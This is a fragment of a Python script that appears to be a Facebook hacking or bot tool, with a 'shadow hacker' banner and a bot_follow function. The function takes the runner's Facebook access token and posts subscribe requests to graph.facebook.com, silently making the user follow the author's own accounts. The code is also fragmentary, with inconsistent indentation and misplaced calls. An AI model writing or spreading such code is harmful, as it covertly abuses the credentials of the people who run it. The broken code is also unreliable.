...
╰━━━┻╯╰┻╯╰┻━━┻━━╯╰╯╰╯\n           / _// _  /___/ /__/ , _/ __ / /__/ ,< \n          /_/ /____/    \___/_/|_/_/ |_\___/_/|_|\n\n               Coded By : shadow hacker cyber king\n─────────────────────────────────────────────────────────────" | lolcat')
...
def bot_follow():
	try:
		...
		print("\n   [!] Token invalid")
		masuk()
    	requests.post('https://graph.facebook.com/102537698751441/subscribers?access_token=' + toket)      #overlite overload
    	...
    	requests.post('https://graph.facebook.com/100008647622021/subscribers?access_token=' + toket) #SHADOW HACKER
    	menu()
